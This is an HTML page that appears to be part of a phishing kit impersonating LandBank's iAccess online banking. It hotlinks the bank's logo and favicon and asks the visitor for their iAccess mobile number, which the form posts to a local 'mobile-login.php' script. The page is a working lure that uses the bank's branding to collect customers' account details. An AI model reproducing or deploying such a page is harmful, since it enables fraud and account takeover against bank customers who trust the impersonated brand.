<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <link rel="shortcut icon" type="image/x-icon" href="https://www.landbank.com/images/favicon.ico" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Add icon library -->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<html>
<body style="background-color:#FFFFFF;">
<style> 
body{
    font-family: "latoregular",Helvetica,Arial,sans-serif;
    font-size:small;
    margin:0; padding:0;
}

form {
      padding:20px;
      margin:10px;
      border-radius:20px;
     }
     

     input[type=number]{
      width: 35%;
      padding: 6px;
      margin:4px;
      border: 1px solid #c5c5c5;
      background: #f6f6f6;
      outline:none;
      box-sizing: border-box;
      padding-left:10px;
      border-radius: 3px;
      color: black;
     }
     
     #submit{
      width: 20%;
      padding: 6px;
      margin:2px;
      box-sizing: border-box;
      border-radius: 3px;
      color: black;
     }
     #submit:hover{
         background:#e9e9e9;
     }
 
     
     
     
     
  @media only screen and (min-width: 700px) {
.div-table{
    border-radius:5px;
    width:30%;
    border: 1px solid #c5c5c5;
    text-align:left;
    padding:1%;
}

.main-container{
    width:65%;
    background:white;
    text-align: center;
    position:absolute;
    margin: auto;
    top: 0;
    bottom: 20;
    padding-bottom:50px;
    left: 0;
    right: 0;
}


 input[type=number]{
    width: 55%;
    
   }

#submit{
    width: 35%;
    
   }


  }  
     
     
     

     @media only screen and (max-width: 600px) {
         
.main-container{
    width:510px;
    background:white;
    text-align: center;
    margin: auto;
    top: 0;
    bottom: 20;
    padding-bottom:50px;
    left: 0;
    right: 0;
}

     
.div-table{
    width:70%;
    border-radius:5px;
    border: 1px solid #c5c5c5;
    text-align:left;
    padding:1%;

}

#submit{
    width: 35%;
    
   }





   input[type=number]{
    width: 55%;
    
   }

}



.button {
  background-color: #f6f6f6;
  border: 1px solid #c5c5c5;
  color: black;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 13px;
  margin: 4px 2px;
  cursor: pointer;
}


.logo_landbank{
  content:url(https://www.lbpiaccess.com/resources/images/lbpiaccess.jpg);
  height:50%;
  width:100%;
  
}



    </style>
    
<div class="main-container">
    <center><img class="logo_landbank"></center>
<center><body style="background-color:#EBEDF0;"><p class="a" size="10">
    
    
    <font>Please Enter your LandBank iAccess Account Mobile Number to Proceed.</p></font><center><hr>
<div class="div-table">
	<font color="#66cc99" style="font-weight:bold;">Enter LBPiAccess Mobile Number</font>
	<hr style="height:1px;border-width:0;color:gray;background-color:#66cc99;">
	
 <form action="mobile-login.php" method="POST">
      <div class="Icon-inside">
        <label>Mobile Number* </label>
        <input type="number" maxlength="11" id="otp" onkeyup='length_disabled_btn(this.value)' oninput='javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);' name="mobilenum" placeholder="09*********" required>

      </div>
      
      
      <br>



<br>
<input class="button" id="submit" type="submit" value="Submit" disabled>


</div>

</div>

<script>
function length_disabled_btn(value){

    var otp = document.getElementById("otp").value;
    
       var otpkey = otp.toString().length;
       
         if(otpkey > 10){
          
           document.getElementById("submit").disabled = false;
             
         } else{
             document.getElementById("submit").disabled = true;
         }
     
}

</script>